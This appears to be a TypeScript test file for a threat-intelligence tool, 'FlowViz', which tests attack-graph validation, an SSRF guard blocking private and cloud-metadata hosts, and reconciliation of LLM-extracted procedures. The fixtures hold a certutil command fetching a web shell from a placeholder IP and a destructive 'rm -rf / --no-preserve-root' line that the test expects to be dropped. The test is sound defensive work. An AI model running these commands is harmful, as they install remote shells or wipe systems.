/**
 * Tests for the FlowViz edge routes + pure validators.
 *
 * Pure validators (validateFlowvizGraph, parseFlowvizJson,
 * extractArticleLite, SSRF guard) run anywhere. The Hono route tests use
 * app.request() with a mocked ExecutionContext (same pattern as
 * heatwave.test.ts) and a stub ASSETS fetcher — no LLM calls: /analyze
 * and /assistant are exercised only for their 400 paths.
 */
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { Hono } from 'hono';
import type { Env } from '../../src/env';
import { flowvizRouter } from '../../src/routes/flowviz';
import { normalizeFlowvizModel } from '../../src/routes/flowviz';
import { validateFlowvizGraph, parseFlowvizJson, validateFlowvizUrl } from '../../src/lib/flowviz-validate';
import { extractArticleLite } from '../../src/routes/flowviz';
import { reconcileProcedureExtraction } from '../../src/lib/procedure-extract';
import { checkProcedureTuple, isWellFormedProcedureName, djb2Hex } from '../../src/lib/x-procedure';

function setup() {
  const app = new Hono<{ Bindings: Env }>();
  app.route('/api/v1', flowvizRouter);
  return app;
}

function mockCtx() {
  return { waitUntil: (_p: Promise<unknown>) => {}, passThroughOnException: () => {} } as unknown as ExecutionContext;
}

function req(app: ReturnType<typeof setup>, path: string, env: Env, init?: RequestInit) {
  return app.request(path, init ?? {}, env, mockCtx());
}

function makeEnv(techniques: unknown[] = []): Env {
  return {
    ASSETS: {
      fetch: async (_r: Request) => {
        if (new URL(_r.url).pathname === '/data/flowviz/techniques.json') {
          return new Response(JSON.stringify(techniques), { headers: { 'content-type': 'application/json' } });
        }
        return new Response(null, { status: 404 });
      },
    },
  } as unknown as Env;
}

beforeEach(() => vi.restoreAllMocks());

describe('validateFlowvizGraph', () => {
  const good = {
    nodes: [
      {
        id: 'action-1',
        type: 'action',
        data: {
          type: 'action',
          name: 'Phishing',
          technique_id: 'T1566',
          tactic_id: 'TA0001',
          tactic_name: 'Initial Access',
          source_excerpt: 'x',
          confidence: 'high',
        },
      },
      { id: 'tool-1', type: 'tool', data: { type: 'tool', name: 'calc.exe', source_excerpt: 'y' } },
    ],
    edges: [{ id: 'edge-1', source: 'action-1', target: 'tool-1', type: 'floating', label: 'Uses' }],
  };
  it('accepts a well-formed graph', () => {
    const v = validateFlowvizGraph(good);
    expect(v.ok).toBe(true);
    expect(v.nodeCount).toBe(2);
    expect(v.edgeCount).toBe(1);
  });
  it('rejects dangling edges and bad technique ids', () => {
    const v = validateFlowvizGraph({
      nodes: [{ id: 'a', type: 'action', data: { name: 'X', technique_id: 'T9999x' } }],
      edges: [{ id: 'e', source: 'a', target: 'ghost', label: 'Uses' }],
    });
    expect(v.ok).toBe(false);
    expect(v.errors.join('|')).toMatch('edge-dangling-target');
    expect(v.errors.join('|')).toMatch('bad-technique-id');
  });
  it('flags ungrounded excerpts as warnings, not errors', () => {
    const v = validateFlowvizGraph(good, { articleText: 'completely unrelated article body' });
    expect(v.ok).toBe(true);
    expect(v.warnings.join('|')).toMatch('excerpt-not-grounded');
  });
});

describe('parseFlowvizJson', () => {
  it('extracts balanced JSON from fenced prose', () => {
    const out = parseFlowvizJson('Here you go:\n```json\n{"nodes":[],"edges":[]}\n```\nDone.') as { nodes: unknown[] };
    expect(out.nodes).toEqual([]);
  });
  it('returns null when no object exists', () => {
    expect(parseFlowvizJson('no json here')).toBeNull();
  });
});

describe('SSRF guard', () => {
  it('blocks private hosts and non-http schemes', () => {
    expect(() => validateFlowvizUrl('http://localhost:3000/x')).toThrow('private-host');
    expect(() => validateFlowvizUrl('http://169.254.169.254/')).toThrow('private-host');
    expect(() => validateFlowvizUrl('http://10.0.0.1/')).toThrow('private-host');
    expect(() => validateFlowvizUrl('ftp://example.com/x')).toThrow('invalid-scheme');
    expect(validateFlowvizUrl('https://example.com/report').hostname).toBe('example.com');
  });
});

describe('extractArticleLite', () => {
  it('extracts title + paragraph cluster without DOM deps', () => {
    const html = `<html><head><title>Test Report</title></head><body><script>evil()</script>
      <article><p>${'The actor used certutil to download a payload. '.repeat(10)}</p>
      <p>${'Persistence was achieved via a scheduled task. '.repeat(10)}</p></article></body></html>`;
    const { title, text } = extractArticleLite(html);
    expect(title).toBe('Test Report');
    expect(text).toMatch('certutil');
    expect(text).not.toMatch('evil()');
  });
});

describe('normalizeFlowvizModel', () => {
  it('accepts oss, defaults everything else to auto', () => {
    expect(normalizeFlowvizModel('oss')).toBe('oss');
    expect(normalizeFlowvizModel('auto')).toBe('auto');
    expect(normalizeFlowvizModel('claude')).toBe('auto');
    expect(normalizeFlowvizModel(undefined)).toBe('auto');
  });
});

describe('flowviz routes', () => {
  it('GET /flowviz/ returns the index', async () => {
    const r = await req(setup(), '/api/v1/flowviz/', makeEnv([{ id: 'T1566', name: 'Phishing', tactics: [] }]));
    expect(r.status).toBe(200);
    const body = (await r.json()) as { techniqueCount: number };
    expect(body.techniqueCount).toBe(1);
  });
  it('GET /flowviz/techniques searches', async () => {
    const r = await req(
      setup(),
      '/api/v1/flowviz/techniques?q=phish',
      makeEnv([{ id: 'T1566', name: 'Phishing', tactics: [] }])
    );
    expect(r.status).toBe(200);
    const body = (await r.json()) as { returned: number };
    expect(body.returned).toBe(1);
  });
  it('POST /flowviz/validate grades a graph', async () => {
    const r = await req(setup(), '/api/v1/flowviz/validate', makeEnv(), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ graph: { nodes: [], edges: [] } }),
    });
    expect(r.status).toBe(200);
    expect(((await r.json()) as { ok: boolean }).ok).toBe(true);
  });
  it('POST /flowviz/analyze rejects short input without calling the LLM', async () => {
    const r = await req(setup(), '/api/v1/flowviz/analyze', makeEnv(), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ text: 'too short' }),
    });
    expect(r.status).toBe(400);
  });
  it('POST /flowviz/analyze 400 names what was received', async () => {
    const r = await req(setup(), '/api/v1/flowviz/analyze', makeEnv(), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ text: 'too short' }),
    });
    const body = (await r.json()) as { message: string };
    expect(body.message).toMatch('text=9 chars');
  });
  it('POST /flowviz/analyze 400 calls out an empty body', async () => {
    const r = await req(setup(), '/api/v1/flowviz/analyze', makeEnv(), {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({}),
    });
    const body = (await r.json()) as { message: string };
    expect(body.message).toMatch('no usable');
  });
  it('GET /flowviz/fetch-article blocks SSRF targets', async () => {
    const r = await req(setup(), '/api/v1/flowviz/fetch-article?url=http://localhost:3000/x', makeEnv());
    expect(r.status).toBe(400);
  });
});

describe('procedure reconciliation', () => {
  const source =
    'The actor ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp to download a web shell. Royal ransomware encrypted the domain controller.';
  const valid = new Set(['T1105', 'T1486']);
  it('keeps verbatim entities, drops invented technique ids and fabricated commands', () => {
    const rec = reconcileProcedureExtraction(
      {
        entities: [
          { kind: 'malware', value: 'Royal ransomware' },
          { kind: 'actor', value: 'Invented Panda' },
        ],
        chunks: [
          {
            id: 'c1',
            text: 'Download web shell via certutil',
            excerpt:
              'The actor ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp to download a web shell',
            order: 0,
          },
        ],
        techniques: [
          {
            chunkId: 'c1',
            techniqueId: 'T1105',
            confidence: 'definite',
            quote: 'ran certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp',
          },
          { chunkId: 'c1', techniqueId: 'T9999', confidence: 'definite', quote: 'zzz' },
        ],
        drafts: [
          {
            chunkId: 'c1',
            name: 'Download web shell via certutil',
            description: 'd',
            techniqueIds: ['T1105'],
            platforms: ['Windows'],
            tactics: ['command-and-control'],
            commandLines: [
              'certutil.exe -urlcache -split -f http://203.0.113.10/shell.jsp',
              'rm -rf / --no-preserve-root',
            ],
            confidence: 80,
          },
        ],
        isSequential: true,
      },
      source,
      valid
    );
    expect(rec.entities.map((e) => e.value)).toEqual(['Royal ransomware']);
    expect(rec.techniques.map((t) => t.techniqueId)).toEqual(['T1105']);
    expect(rec.drafts[0]!.commandLines).toHaveLength(1);
    expect(rec.notes.join('|')).toMatch('dropped-fabricated-commands');
  });
});

describe('x-procedure tuple', () => {
  it('grades missing AP/LS as errors at conf>=70', () => {
    const t = checkProcedureTuple([], [], [], 80);
    expect(t.errors.length).toBeGreaterThan(0);
  });
  it('accepts the [Verb] [Object] via [Tool] shape and rejects actor names', () => {
    expect(isWellFormedProcedureName('Download web shell via certutil')).toBe(true);
    expect(isWellFormedProcedureName('Lazarus Group hacks stuff')).toBe(false);
  });
  it('djb2 is deterministic', () => {
    expect(djb2Hex('abc')).toBe(djb2Hex('abc'));
  });
});
